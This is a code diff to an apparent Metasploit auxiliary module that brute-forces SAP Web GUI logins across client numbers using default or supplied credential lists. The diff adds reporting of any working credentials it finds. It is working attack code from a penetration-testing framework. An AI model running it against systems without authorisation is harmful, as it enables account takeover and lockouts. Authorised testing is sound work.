@@ -27,30 +27,42 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'SAP Web GUI Brute Force',
+			'Name' => 'SAP Web GUI Login Brute Forcer',
 			'Description' => %q{
-				SAP Web GUI Brute Force.
-				},
-			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]],
-			'Author' => [ 'nmonkee' ],
-			'License' => BSD_LICENSE
-			)
-		register_options([
-			OptString.new('TARGETURI', [true, 'URI', '/']),
-			OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
-			OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),
-			OptString.new('USERPASS_FILE',[false, '',nil])
+				This module attempts to brute force SAP username and passwords through the SAP Web
+				GUI service. Default clients can be	tested without needing to set a CLIENT. Common
+				and default user/password combinations can be tested just setting the DEFAULT_CRED
+				variable to true. The MSF_DATA_DIRECTORY/wordlists/sap_default.txt path store
+				stores these default combinations.
+			},
+			'References' =>
+				[
+					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
+				],
+			'Author' =>
+				[
+					'nmonkee'
+				],
+			'License' => MSF_LICENSE
+
+		)
+		register_options(
+			[
+				Opt::RPORT(8000),
+				OptString.new('TARGETURI', [true, 'URI', '/']),
+				OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
+				OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),
+				OptString.new('USERPASS_FILE',[false, '',nil])
 			], self.class)
-		register_autofilter_ports([80])
 	end
 
 	def run_host(ip)
-		uri = datastore['TARGETURI']
+		uri = target_uri.to_s
 		if datastore['CLIENT'].nil?
 			print_status("Using default SAP client list")
 			client = ['000','001','066']
 		else
-		client = []
+			client = []
 			if datastore['CLIENT'] =~ /^\d{3},/
 				client = datastore['CLIENT'].split(/,/)
 				print_status("Brute forcing clients #{datastore['CLIENT']}")
@@ -72,20 +84,29 @@ class Metasploit4 < Msf::Auxiliary
 			'Postfix' => "\n",
 			'Indent'  => 1,
 			'Columns' => ["host","port","client","user","pass"])
-		if datastore['USERPASS_FILE']
-			credentials = extract_word_pair(datastore['USERPASS_FILE'])
-			credentials.each do |u,p|
+
+
+		if datastore['DEFAULT_CRED']
+			credentials = extract_word_pair(Msf::Config.data_directory + '/wordlists/sap_default.txt')
+			credentials.each do |u, p|
 				client.each do |cli|
-					success = bruteforce(uri,u,p,cli)
-					if success == true
-						saptbl << [ip,rport,cli,u,p]
+					success = bruteforce(uri, u, p, cli)
+					if success
+						saptbl << [ rhost, rport, cli, u, p]
 					end
 				end
 			end
-		else
-			datastore['USERPASS_FILE'] = Msf::Config.data_directory + '/wordlists/sap_default.txt'
+		end
+		each_user_pass do |u, p|
+			client.each do |cli|
+				success = bruteforce(uri, u, p, cli)
+				if success
+					saptbl << [ rhost, rport, cli, u, p]
+				end
+			end
 		end
 		print(saptbl.to_s)
+
 	end
 
 	def bruteforce(uri,user,pass,cli)
@@ -110,23 +131,43 @@ class Metasploit4 < Msf::Auxiliary
 					}
 				})
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-			print_error("[SAP] #{ip}:#{rport} - Service failed to respond")
+			print_error("[SAP] #{rhost}:#{rport} - Service failed to respond")
 			return false
 		end
 
 		if res and res.code == 302
+			report_auth_info(
+				:host => rhost,
+				:port => rport,
+				:sname => "sap_webgui",
+				:proto => "tcp",
+				:user => "#{user}",
+				:pass => "#{pass}",
+				:proof => "SAP Client: #{cli}",
+				:active => true
+			)
 			return true
 		elsif res and res.code == 200
 			if res.body =~ /log on again/
 				return false
 			elsif res.body =~ /<title>Change Password - SAP Web Application Server<\/title>/
+				report_auth_info(
+					:host => rhost,
+					:port => rport,
+					:sname => "sap_webgui",
+					:proto => "tcp",
+					:user => "#{user}",
+					:pass => "#{pass}",
+					:proof => "SAP Client: #{cli}",
+					:active => true
+				)
 				return true
 			elsif res.body =~ /Password logon no longer possible - too many failed attempts/
-				print_error("[SAP] #{ip}:#{rport} - #{user} locked in client #{cli}")
+				print_error("[SAP] #{rhost}:#{rport} - #{user} locked in client #{cli}")
 				return false
 			end
 		else
-			print_error("[SAP] #{ip}:#{rport} - error trying #{user}/#{pass} against client #{cli}")
+			print_error("[SAP] #{rhost}:#{rport} - error trying #{user}/#{pass} against client #{cli}")
 			return false
 		end
 	end
